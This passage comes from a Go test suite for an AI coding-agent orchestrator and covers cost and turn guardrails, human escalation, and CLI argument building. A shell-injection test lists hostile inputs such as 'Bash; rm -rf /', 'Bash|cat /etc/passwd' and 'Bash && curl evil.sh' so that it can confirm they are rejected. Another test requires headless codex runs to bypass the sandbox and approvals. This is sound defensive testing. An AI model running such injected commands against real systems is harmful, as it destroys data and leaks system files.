	if got := len(a.Output()); got != 20 {
		t.Errorf("got %d events, want 20 — stream stopped early", got)
	}
}

// TestGuardrails_TurnsAutoContinue_CostBelowCap verifies that when an agent
// hits MaxTurns but cumulative cost is well below the MaxCostUSD threshold,
// the runner auto-continues without blocking on escalationCh and without
// emitting a blocking escalation event.
func TestGuardrails_TurnsAutoContinue_CostBelowCap(t *testing.T) {
	// 5 assistant events — limit is 3 so the 3rd fires the guardrail.
	var lines []string
	for range 5 {
		lines = append(lines, `{"type":"assistant","message":{"content":[{"type":"text","text":"tick"}]}}`)
	}
	input := strings.Join(lines, "\n") + "\n"

	var (
		blocked int
		mu      sync.Mutex
	)
	emit := func(event string, data any) {
		if !strings.Contains(event, "agent:escalation:") {
			return
		}
		if e, ok := data.(EscalationEvent); ok && e.Reason == "turns" {
			mu.Lock()
			blocked++
			mu.Unlock()
		}
	}
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), emit, logger, t.TempDir())
	// Cost cap set, but agent has spent $0 — well below 80% of $10.
	m.SetGuardrails(Guardrails{MaxCostUSD: 10.0, MaxTurns: 3})

	// No escalationCh needed because auto-continue path never blocks.
	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	if blocked != 0 {
		t.Errorf("expected no blocking escalation, got %d", blocked)
	}
	if got := len(a.Output()); got != 5 {
		t.Errorf("got %d events, want 5 — stream stopped early", got)
	}
}

// TestGuardrails_TurnsBlocks_CostNearCap verifies that when an agent hits
// MaxTurns and cumulative cost is above TurnCostFraction * MaxCostUSD, the
// runner falls through to the human-gate path (blocking on escalationCh).
func TestGuardrails_TurnsBlocks_CostNearCap(t *testing.T) {
	// 4 assistant events; limit is 3 so the 3rd triggers.
	var lines []string
	for range 4 {
		lines = append(lines, `{"type":"assistant","message":{"content":[{"type":"text","text":"tick"}]}}`)
	}
	// Prepend a result event so the agent's cost is seeded before turns fire.
	resultLine := `{"type":"result","result":"r","session_id":"s1","total_cost_usd":9.0,"total_input_tokens":1,"total_output_tokens":1}`
	input := resultLine + "\n" + strings.Join(lines, "\n") + "\n"

	var (
		autoContinued int
		blocked       int
		mu            sync.Mutex
	)
	emit := func(event string, data any) {
		if !strings.Contains(event, "agent:escalation:") {
			return
		}
		if e, ok := data.(EscalationEvent); ok {
			mu.Lock()
			switch e.Reason {
			case "turns_auto_continued":
				autoContinued++
			case "turns":
				blocked++
			}
			mu.Unlock()
		}
	}
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), emit, logger, t.TempDir())
	// Cost cap $10, agent already spent $9 — above 80% threshold.
	m.SetGuardrails(Guardrails{MaxCostUSD: 10.0, MaxTurns: 3})

	ctx, cancel := context.WithCancel(t.Context())
	// Respond to the escalation immediately: send false (kill) so the stream
	// exits cleanly without hanging the test.
	a := &Agent{ID: "t", Provider: "claude", escalationCh: make(chan bool, 1)}
	raised := make(chan bool, 1)
	go func() {
		// Wait until the escalation has actually been raised, then cancel.
		raised <- pollUntil(2*time.Second, time.Millisecond, func() bool {
			mu.Lock()
			defer mu.Unlock()
			return blocked > 0
		})
		cancel()
	}()
	m.streamHeadlessOutput(ctx, a, bytes.NewReader([]byte(input)), nil)

	if !<-raised {
		t.Error("turns escalation was never raised before cancellation")
	}

	mu.Lock()
	defer mu.Unlock()
	if autoContinued != 0 {
		t.Errorf("expected no auto-continue (cost near cap), got %d", autoContinued)
	}
	if blocked == 0 {
		t.Error("expected blocking turns escalation event, got none")
	}
}

// TestGuardrails_SubagentAssistantTurnsExcluded verifies that Claude
// assistant events carrying parent_tool_use_id (forked subagent turns) do
// not increment Agent.TurnCount, while top-level assistant events (no
// parent_tool_use_id) do. A regression in the parser or conversion path
// that dropped parent_tool_use_id would silently reintroduce fan-out turn
// inflation and trip MaxTurns on legitimate subagent chatter.
func TestGuardrails_SubagentAssistantTurnsExcluded(t *testing.T) {
	lines := []string{
		`{"type":"assistant","message":{"content":[{"type":"text","text":"top1"}]}}`,
		`{"type":"assistant","parent_tool_use_id":"toolu_1","message":{"content":[{"type":"text","text":"sub1"}]}}`,
		`{"type":"assistant","parent_tool_use_id":"toolu_1","message":{"content":[{"type":"text","text":"sub2"}]}}`,
		`{"type":"assistant","message":{"content":[{"type":"text","text":"top2"}]}}`,
	}
	input := strings.Join(lines, "\n") + "\n"

	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), func(string, any) {}, logger, t.TempDir())
	m.SetGuardrails(Guardrails{MaxTurns: 0})

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	if got := len(a.Output()); got != 4 {
		t.Fatalf("got %d events, want 4 — stream stopped early", got)
	}
	if got := a.GetTurnCount(); got != 2 {
		t.Errorf("TurnCount = %d, want 2 (only top-level assistant events count)", got)
	}
}

// TestGuardrails_SetMidRunVisibleToStream verifies SetGuardrails picks up
// live — the stream loop re-reads m.guardrails under RLock on every event,
// so a user who tightens the cost limit mid-run sees escalation on the
// next result. A regression that cached the guardrails at start of loop
// would miss the new limit and let the agent keep burning budget.
func TestGuardrails_SetMidRunVisibleToStream(t *testing.T) {
	// Same session both times — cost is a cumulative-per-session snapshot,
	// so result #2's 12.0 is the real running total (not summed with #1's
	// 5.0), and it's what must push the tightened limit.
	input := `{"type":"result","result":"r1","session_id":"s1","total_cost_usd":5.0,"total_input_tokens":1,"total_output_tokens":1}` + "\n" +
		`{"type":"result","result":"r2","session_id":"s1","total_cost_usd":12.0,"total_input_tokens":1,"total_output_tokens":1}` + "\n"

	var (
		escalations int
		mu          sync.Mutex
	)
	var managerRef *Manager
	emit := func(event string, _ any) {
		if strings.Contains(event, "agent:escalation:") {
			mu.Lock()
			escalations++
			mu.Unlock()
		}
		if strings.Contains(event, "agent:output:") && managerRef != nil {
			// Tighten the guardrail the first time we see an output event,
			// so it's already in effect when the loop processes result #2.
			managerRef.SetGuardrails(Guardrails{MaxCostUSD: 10.0})
		}
	}
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), emit, logger, t.TempDir())
	managerRef = m
	// Start unlimited so result #1 doesn't escalate.
	m.SetGuardrails(Guardrails{MaxCostUSD: 0})

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	// Cumulative cost after result #2 = 12.0, > new limit 10.0.
	if escalations != 1 {
		t.Errorf("got %d escalation events, want 1 (limit tightened mid-run should fire on result #2)", escalations)
	}
}

// TestGuardrails_CostHardStopsStream verifies the cost guardrail's hard-stop
// path: breaching MaxCostUSD must stop the stream immediately without waiting
// for a human response, so no further lines are processed.
func TestGuardrails_CostHardStopsStream(t *testing.T) {
	resultLine := `{"type":"result","result":"r","session_id":"s1","total_cost_usd":11.0,"total_input_tokens":1,"total_output_tokens":1}`
	trailingLine := `{"type":"assistant","message":{"content":[{"type":"text","text":"should never be processed"}]}}`
	input := resultLine + "\n" + trailingLine + "\n"

	var (
		blocked int
		mu      sync.Mutex
	)
	emit := func(event string, data any) {
		if !strings.Contains(event, "agent:escalation:") {
			return
		}
		if e, ok := data.(EscalationEvent); ok && e.Reason == "cost" {
			mu.Lock()
			blocked++
			mu.Unlock()
		}
	}
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), emit, logger, t.TempDir())
	m.SetGuardrails(Guardrails{MaxCostUSD: 10.0})

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	if blocked != 1 {
		t.Errorf("got %d cost escalation events, want 1", blocked)
	}
	// Only the result event should have been appended; the trailing
	// assistant line must never reach the stream after the reject.
	if got := len(a.Output()); got != 1 {
		t.Errorf("got %d events, want 1 — stream kept processing lines after a rejected cost escalation", got)
	}
}

// TestGuardrails_CostHardStopMarksStopped verifies that a cost hard-stop marks
// the process as stopped so the runner kills it immediately after the breach
// and records the reason needed by completion classification. That keeps the
// run classified as an intentional Sybra stop, not a provider crash.
func TestGuardrails_CostHardStopMarksStopped(t *testing.T) {
	input := `{"type":"result","result":"r","session_id":"s1","total_cost_usd":11.0,"total_input_tokens":1,"total_output_tokens":1}` + "\n"

	var (
		blocked int
		mu      sync.Mutex
	)
	emit := func(event string, data any) {
		if !strings.Contains(event, "agent:escalation:") {
			return
		}
		if e, ok := data.(EscalationEvent); ok && e.Reason == "cost" {
			mu.Lock()
			blocked++
			mu.Unlock()
		}
	}
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), emit, logger, t.TempDir())
	m.SetGuardrails(Guardrails{MaxCostUSD: 10.0})

	a := &Agent{ID: "t", Provider: "claude"}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	if blocked == 0 {
		t.Error("expected cost escalation event, got none")
	}
	if !a.WasStopped() {
		t.Error("WasStopped() = false, want true after cost hard-stop")
	}
	if got := a.EscalationReason; got != "cost" {
		t.Errorf("EscalationReason = %q, want cost", got)
	}
}

// TestGuardrails_CostKillRaceSetsExitErr verifies the fix for the
// kill-returns-success bug: when a guardrail-killed detached subprocess is
// not reaped within drainTimeout, the attempt must still record a non-nil
// ExitErr instead of silently leaving it nil (the zero value), which would
// make finalizeRun/OnComplete misreport the killed partial run as a clean
// success. Shrinks drainTimeout and uses a fake claude that ignores SIGINT
// so the race window is reliably hit without waiting out the real grace.
func TestGuardrails_CostKillRaceSetsExitErr(t *testing.T) {
	prevDrain := drainTimeout
	drainTimeout = 50 * time.Millisecond
	t.Cleanup(func() { drainTimeout = prevDrain })

	binDir := t.TempDir()
	fakeClaude := filepath.Join(binDir, "claude")
	script := "#!/bin/sh\n" +
		"trap '' INT TERM\n" +
		"printf '%s\\n' '{\"type\":\"result\",\"result\":\"done\",\"session_id\":\"sess-race\",\"total_cost_usd\":11.0,\"total_input_tokens\":1,\"total_output_tokens\":1}'\n" +
		"sleep 10\n"
	if err := os.WriteFile(fakeClaude, []byte(script), 0o755); err != nil {
		t.Fatalf("write fake claude: %v", err)
	}
	t.Setenv("PATH", binDir+string(os.PathListSeparator)+os.Getenv("PATH"))

	m := mustNewManager(t, context.Background(), func(string, any) {}, slog.New(slog.DiscardHandler), t.TempDir(), ManagerConfig{
		Runtime:           ManagerRuntimeConfig{DefaultProvider: "claude"},
		SurviveRestartDir: t.TempDir(),
	})
	m.SetGuardrails(Guardrails{MaxCostUSD: 10.0})

	ag, err := m.Run(RunConfig{
		TaskID:             "task-race",
		Name:               "implementation: race",
		Mode:               "headless",
		Prompt:             "trigger guardrail kill",
		Dir:                t.TempDir(),
		RequirePermissions: false,
	})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	// The fake process ignores SIGINT/SIGTERM and finalizeRun's early return
	// (the very race under test) closes ag.done before signalKill's SIGKILL
	// escalation grace elapses, so nothing else in the runner ever kills it.
	// Force it directly so the runner's own cmd.Wait() goroutine unblocks
	// instead of leaking past the test.
	t.Cleanup(func() {
		if cmd := ag.GetCmd(); cmd != nil && cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		time.Sleep(200 * time.Millisecond)
	})

	// finalizeRun (and the close of ag.done) must not block on the slow
	// subprocess reap — it happens on the shrunk drainTimeout, well before
	// the real SIGKILL escalation (stopSIGINTGrace) would land.
	waitForAgentDone(t, ag, 3*time.Second)

	if !ag.WasStopped() {
		t.Fatal("expected WasStopped=true after guardrail kill")
	}
	if ag.GetExitErr() == nil {
		t.Fatal("ExitErr = nil after a guardrail kill raced the reap — finalizeRun/OnComplete will misreport this killed run as a clean success")
	}
}

// TestRespondEscalation_DoubleSendRejected verifies the escalation channel
// is buffered size 1 and a second RespondEscalation call before the agent
// drains the first returns a clear error instead of blocking the caller.
// A regression that removed the non-blocking send would hang the UI thread
// when a user double-clicks Approve.
func TestRespondEscalation_DoubleSendRejected(t *testing.T) {
	m, _ := newTestManager(t)
	a := &Agent{ID: "esc1", State: StateRunning, escalationCh: make(chan bool, 1)}
	m.mu.Lock()
	m.agents[a.ID] = a
	m.mu.Unlock()

	if err := m.RespondEscalation(a.ID, true); err != nil {
		t.Fatalf("first RespondEscalation: %v", err)
	}
	// Second call must fail fast (channel full), not block.
	done := make(chan error, 1)
	go func() { done <- m.RespondEscalation(a.ID, true) }()
	select {
	case err := <-done:
		if err == nil {
			t.Fatal("second RespondEscalation returned nil; expected 'channel full' error")
		}
	case <-time.After(500 * time.Millisecond):
		t.Fatal("second RespondEscalation blocked instead of returning error — UI thread would hang")
	}
}

// TestBuildHeadlessInvocation_RejectsShellInjection verifies the safeArgRe
// allowlist refuses values that could inject into the subprocess command
// line. A regression that broadened the regex (e.g. allowing spaces,
// quotes, shell metacharacters) would enable command injection via task
// AllowedTools or Model. The test exercises both the Claude and Codex
// branches since they share the same regex check.
func TestBuildHeadlessInvocation_RejectsShellInjection(t *testing.T) {
	// Tool names with shell metacharacters must be rejected. Hyphen-only
	// strings like "--dangerously-skip-permissions" are NOT listed here
	// intentionally: AllowedTools is joined with "," into a single --allowedTools
	// arg, so a flag-shaped value becomes a tool-name string inside that CSV,
	// not a separate flag. The risk surface is shell metacharacters that could
	// escape quoting, which is what safeArgRe blocks.
	injections := []string{
		"Bash; rm -rf /",
		"Bash`whoami`",
		"Bash $(id)",
		"Bash\"`id`\"",
		"Bash|cat /etc/passwd",
		"Bash && curl evil.sh",
		"Bash\nmalicious", // newline injection
		" Bash",           // leading space
		"Bash ",           // trailing space
		"",                // empty tool name
	}

	for _, bad := range injections {
		t.Run("tool_"+bad, func(t *testing.T) {
			a := &Agent{ID: "a", Provider: "claude"}
			_, _, _, _, err := buildHeadlessInvocation(a, RunConfig{
				Prompt:       "ok",
				AllowedTools: []string{bad},
			})
			if err == nil {
				t.Errorf("buildHeadlessInvocation accepted injection tool %q; safeArgRe must reject", bad)
			}
		})
	}

	for _, bad := range []string{"sonnet --extra-flag", "opus;id", "gpt-5 $(id)", "model\"inject"} {
		t.Run("model_"+bad, func(t *testing.T) {
			a := &Agent{ID: "a", Provider: "claude", Model: bad}
			_, _, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "ok"})
			if err == nil {
				t.Errorf("buildHeadlessInvocation accepted injection model %q; safeArgRe must reject", bad)
			}
		})
	}

	// Sanity check: safe tool and model names are accepted.
	a := &Agent{ID: "a", Provider: "claude", Model: "sonnet"}
	_, _, _, _, err := buildHeadlessInvocation(a, RunConfig{
		Prompt:       "ok",
		AllowedTools: []string{"Bash", "Read", "Write"},
	})
	if err != nil {
		t.Fatalf("safe invocation rejected: %v", err)
	}
}

// TestGuardrails_PerAgentOverrideWins verifies that a per-agent MaxTurns
// greater than the global limit prevents escalation until the per-agent limit
// is reached.
func TestGuardrails_PerAgentOverrideWins(t *testing.T) {
	// global=5, per-agent=20 → feed 10 assistant events, no escalation expected.
	var lines []string
	for range 10 {
		lines = append(lines, `{"type":"assistant","message":{"content":[{"type":"text","text":"tick"}]}}`)
	}
	input := strings.Join(lines, "\n") + "\n"

	var escalations int
	var mu sync.Mutex
	emit := func(event string, _ any) {
		if strings.Contains(event, "agent:escalation:") {
			mu.Lock()
			escalations++
			mu.Unlock()
		}
	}
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), emit, logger, t.TempDir())
	m.SetGuardrails(Guardrails{MaxTurns: 5})

	a := &Agent{ID: "t", Provider: "claude", MaxTurns: 20}
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	if escalations != 0 {
		t.Errorf("per-agent MaxTurns=20 should override global=5; got %d escalation events after 10 assistant events", escalations)
	}
}

// TestGuardrails_PerAgentOverrideLower verifies that a per-agent MaxTurns
// lower than the global limit causes escalation at the per-agent limit.
func TestGuardrails_PerAgentOverrideLower(t *testing.T) {
	// global=20, per-agent=5 → feed 6 assistant events, expect escalation.
	var lines []string
	for range 6 {
		lines = append(lines, `{"type":"assistant","message":{"content":[{"type":"text","text":"tick"}]}}`)
	}
	input := strings.Join(lines, "\n") + "\n"

	var escalations int
	var mu sync.Mutex
	emit := func(event string, _ any) {
		if strings.Contains(event, "agent:escalation:") {
			mu.Lock()
			escalations++
			mu.Unlock()
		}
	}
	logger := slog.New(slog.DiscardHandler)
	m := mustNewManager(t, context.Background(), emit, logger, t.TempDir())
	// MaxCostUSD set; agent cost seeded above 80% threshold so auto-continue is suppressed.
	m.SetGuardrails(Guardrails{MaxCostUSD: 10.0, MaxTurns: 20})

	_, cancel := context.WithCancel(context.Background())
	a := &Agent{ID: "t", Provider: "claude", MaxTurns: 5, CostUSD: 9.0, escalationCh: make(chan bool, 1), cancel: cancel}
	// Pre-fill the escalation channel so the runner doesn't block.
	a.escalationCh <- false
	m.streamHeadlessOutput(t.Context(), a, bytes.NewReader([]byte(input)), nil)

	mu.Lock()
	defer mu.Unlock()
	if escalations != 1 {
		t.Errorf("per-agent MaxTurns=5 should escalate before global=20; got %d escalation events", escalations)
	}
}

// TestBuildHeadlessInvocation_BashTimeout verifies that the Bash tool timeout
// is delivered to claude via BASH_DEFAULT_TIMEOUT_MS / BASH_MAX_TIMEOUT_MS env
// vars (claude has no `--bashTimeoutMs` CLI flag) when cfg.BashTimeoutMs > 0,
// and that no timeout is injected when it is zero or for codex.
func TestBuildHeadlessInvocation_BashTimeout(t *testing.T) {
	t.Run("env_set_for_claude", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		_, args, env, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			BashTimeoutMs: 300000,
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		if slices.Contains(args, "--bashTimeoutMs") {
			t.Fatal("--bashTimeoutMs is not a real claude CLI flag and must not appear in args")
		}
		want := []string{
			"BASH_DEFAULT_TIMEOUT_MS=300000",
			"BASH_MAX_TIMEOUT_MS=300000",
		}
		for _, w := range want {
			if !slices.Contains(env, w) {
				t.Errorf("env missing %q; got %v", w, env)
			}
		}
	})

	t.Run("env_absent_when_zero", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		_, _, env, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			BashTimeoutMs: 0,
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		for _, e := range env {
			if strings.HasPrefix(e, "BASH_DEFAULT_TIMEOUT_MS=") || strings.HasPrefix(e, "BASH_MAX_TIMEOUT_MS=") {
				t.Fatalf("bash timeout env must be absent when BashTimeoutMs == 0; got %q", e)
			}
		}
	})

	t.Run("not_set_for_codex", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "codex"}
		_, args, env, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			BashTimeoutMs: 300000,
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation codex: %v", err)
		}
		if slices.Contains(args, "--bashTimeoutMs") {
			t.Fatal("--bashTimeoutMs must not be passed to codex")
		}
		for _, e := range env {
			if strings.HasPrefix(e, "BASH_DEFAULT_TIMEOUT_MS=") || strings.HasPrefix(e, "BASH_MAX_TIMEOUT_MS=") {
				t.Fatalf("bash timeout env must not be set for codex; got %q", e)
			}
		}
	})
}

func TestBuildHeadlessInvocation_CodexReasoningEffort(t *testing.T) {
	t.Parallel()

	t.Run("flag_present_when_set", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "codex", ReasoningEffort: "high"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "hi"})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		found := false
		for i := range len(args) - 1 {
			if args[i] == "-c" && args[i+1] == "model_reasoning_effort=high" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected -c model_reasoning_effort=high in args; got %v", args)
		}
	})

	t.Run("flag_absent_when_empty", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "codex", ReasoningEffort: ""}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "hi"})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		for _, arg := range args {
			if strings.Contains(arg, "model_reasoning_effort=") {
				t.Errorf("model_reasoning_effort must be absent when empty; got %v", args)
			}
		}
	})

	t.Run("not_present_for_claude", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude", ReasoningEffort: "high"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "hi"})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		for _, arg := range args {
			if strings.Contains(arg, "model_reasoning_effort=") {
				t.Errorf("model_reasoning_effort must not appear for claude provider; got %v", args)
			}
		}
	})
}

// TestBuildHeadlessInvocation_EffortFlag verifies claude and copilot headless
// runs carry --effort <level> from the agent's ReasoningEffort (the same value
// codex feeds to model_reasoning_effort), and omit it when unset.
func TestBuildHeadlessInvocation_EffortFlag(t *testing.T) {
	t.Parallel()

	hasEffort := func(args []string, level string) bool {
		for i := range len(args) - 1 {
			if args[i] == "--effort" && args[i+1] == level {
				return true
			}
		}
		return false
	}
	hasEffortFlag := func(args []string) bool {
		return slices.Contains(args, "--effort")
	}

	for _, provider := range []string{"claude", "copilot"} {
		t.Run(provider+"_present_when_set", func(t *testing.T) {
			a := &Agent{ID: "a", Provider: provider, ReasoningEffort: "medium"}
			_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "hi"})
			if err != nil {
				t.Fatalf("buildHeadlessInvocation: %v", err)
			}
			if !hasEffort(args, "medium") {
				t.Errorf("expected --effort medium in %s args; got %v", provider, args)
			}
		})
		t.Run(provider+"_absent_when_empty", func(t *testing.T) {
			a := &Agent{ID: "a", Provider: provider, ReasoningEffort: ""}
			_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{Prompt: "hi"})
			if err != nil {
				t.Fatalf("buildHeadlessInvocation: %v", err)
			}
			if hasEffortFlag(args) {
				t.Errorf("--effort must be absent when empty; got %v", args)
			}
		})
	}
}

func TestPrepareRunConfig_DefaultsReasoningEffortForAllProviders(t *testing.T) {
	t.Parallel()

	hasPair := func(args []string, key, value string) bool {
		for i := range len(args) - 1 {
			if args[i] == key && args[i+1] == value {
				return true
			}
		}
		return false
	}

	for _, provider := range []string{"claude", "codex", "copilot"} {
		t.Run(provider, func(t *testing.T) {
			t.Parallel()
			m := newParseTestManager(t)
			cfg, prov, err := m.prepareRunConfig(RunConfig{
				Provider: provider,
				Mode:     "headless",
				Prompt:   "hi",
				Dir:      t.TempDir(),
			})
			if err != nil {
				t.Fatalf("prepareRunConfig: %v", err)
			}
			if cfg.ReasoningEffort != DefaultReasoningEffort {
				t.Fatalf("ReasoningEffort = %q, want %q", cfg.ReasoningEffort, DefaultReasoningEffort)
			}
			a := newRunningAgent("a", cfg, prov, func() {})
			_, args, _, _, err := buildHeadlessInvocation(a, cfg)
			if err != nil {
				t.Fatalf("buildHeadlessInvocation: %v", err)
			}
			if provider == "codex" {
				if !hasPair(args, "-c", "model_reasoning_effort="+DefaultReasoningEffort) {
					t.Fatalf("expected -c model_reasoning_effort=%s in args; got %v", DefaultReasoningEffort, args)
				}
				return
			}
			if !hasPair(args, "--effort", DefaultReasoningEffort) {
				t.Fatalf("expected --effort %s in %s args; got %v", DefaultReasoningEffort, provider, args)
			}
		})
	}
}

func TestPrepareRunConfig_PreservesExplicitReasoningEffort(t *testing.T) {
	t.Parallel()

	for _, provider := range []string{"claude", "codex", "copilot"} {
		t.Run(provider, func(t *testing.T) {
			t.Parallel()
			m := newParseTestManager(t)
			cfg, _, err := m.prepareRunConfig(RunConfig{
				Provider:        provider,
				Mode:            "headless",
				Prompt:          "hi",
				Dir:             t.TempDir(),
				ReasoningEffort: "high",
			})
			if err != nil {
				t.Fatalf("prepareRunConfig: %v", err)
			}
			if cfg.ReasoningEffort != "high" {
				t.Fatalf("ReasoningEffort = %q, want high", cfg.ReasoningEffort)
			}
		})
	}
}

// TestBuildHeadlessInvocation_CodexAlwaysBypassesSandbox verifies that headless
// codex invocations always use --dangerously-bypass-approvals-and-sandbox,
// even when RequirePermissions=true. In headless mode there is no UI to serve
// --sandbox workspace-write approval prompts; auto-rejection silently breaks
// the agent run.
func TestBuildHeadlessInvocation_CodexAlwaysBypassesSandbox(t *testing.T) {
	cases := []struct {
		name           string
		requirePerms   bool
		disableSandbox string // SYBRA_DISABLE_CODEX_SANDBOX value
		wantBypass     bool
		wantDangerFull bool
	}{
		{
			name:         "require_perms_false_bypasses",
			requirePerms: false,
			wantBypass:   true,
		},
		{
			name:         "require_perms_true_still_bypasses_in_headless",
			requirePerms: true,
			wantBypass:   true,
		},
		{
			name:           "disable_sandbox_env_overrides_all",
			requirePerms:   true,
			disableSandbox: "1",
			wantDangerFull: true,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv("SYBRA_DISABLE_CODEX_SANDBOX", tc.disableSandbox)

			a := &Agent{ID: "a", Provider: "codex"}
			_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
				Prompt:             "hi",
				RequirePermissions: tc.requirePerms,
			})
			if err != nil {
				t.Fatalf("buildHeadlessInvocation: %v", err)
			}

			if tc.wantBypass {
				if !slices.Contains(args, "--dangerously-bypass-approvals-and-sandbox") {
					t.Errorf("args missing --dangerously-bypass-approvals-and-sandbox; got %v", args)
				}
				if slices.Contains(args, "--sandbox") {
					t.Errorf("--sandbox must not appear when bypassing; got %v", args)
				}
			}
			if tc.wantDangerFull {
				if !slices.Contains(args, "danger-full-access") {
					t.Errorf("args missing danger-full-access; got %v", args)
				}
			}
		})
	}
}

// TestBuildHeadlessInvocation_RetryWatchdog verifies that CLAUDE_CODE_RETRY_WATCHDOG
// is injected via env (not a CLI flag) when cfg.RetryWatchdog > 0, and is absent
// when zero. Codex invocations must not receive the env var.
func TestBuildHeadlessInvocation_RetryWatchdog(t *testing.T) {
	t.Run("env_set_for_claude", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		_, args, env, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			RetryWatchdog: 30,
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		for _, arg := range args {
			if strings.Contains(arg, "RETRY_WATCHDOG") || strings.Contains(arg, "retry_watchdog") {
				t.Fatalf("RETRY_WATCHDOG must not appear as a CLI arg; got %v", args)
			}
		}
		want := "CLAUDE_CODE_RETRY_WATCHDOG=30"
		if !slices.Contains(env, want) {
			t.Errorf("env missing %q; got %v", want, env)
		}
	})

	t.Run("env_absent_when_zero", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		_, _, env, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			RetryWatchdog: 0,
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		for _, e := range env {
			if strings.HasPrefix(e, "CLAUDE_CODE_RETRY_WATCHDOG=") {
				t.Fatalf("RETRY_WATCHDOG env must be absent when RetryWatchdog == 0; got %q", e)
			}
		}
	})

	t.Run("not_set_for_codex", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "codex"}
		_, _, env, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			RetryWatchdog: 30,
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation codex: %v", err)
		}
		for _, e := range env {
			if strings.HasPrefix(e, "CLAUDE_CODE_RETRY_WATCHDOG=") {
				t.Fatalf("RETRY_WATCHDOG env must not be set for codex; got %q", e)
			}
		}
	})
}

// TestBuildHeadlessInvocation_FallbackModel verifies that --fallback-model is
// added to args when cfg.FallbackModel is set, and absent when empty. Codex
// invocations must not receive the flag.
func TestBuildHeadlessInvocation_FallbackModel(t *testing.T) {
	t.Run("flag_set_for_claude", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			FallbackModel: "haiku",
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		idx := slices.Index(args, "--fallback-model")
		if idx < 0 {
			t.Fatalf("args missing --fallback-model; got %v", args)
		}
		if idx+1 >= len(args) || args[idx+1] != "haiku" {
			t.Errorf("--fallback-model value wrong; args=%v", args)
		}
	})

	t.Run("flag_absent_when_empty", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			FallbackModel: "",
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation: %v", err)
		}
		if slices.Contains(args, "--fallback-model") {
			t.Fatalf("--fallback-model must be absent when FallbackModel is empty; got %v", args)
		}
	})

	t.Run("invalid_fallback_model_rejected", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "claude"}
		_, _, _, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			FallbackModel: "bad model; rm -rf /",
		})
		if err == nil {
			t.Fatal("expected error for invalid fallback model, got nil")
		}
	})

	t.Run("not_set_for_codex", func(t *testing.T) {
		a := &Agent{ID: "a", Provider: "codex"}
		_, args, _, _, err := buildHeadlessInvocation(a, RunConfig{
			Prompt:        "hi",
			FallbackModel: "haiku",
		})
		if err != nil {
			t.Fatalf("buildHeadlessInvocation codex: %v", err)
		}
		if slices.Contains(args, "--fallback-model") {
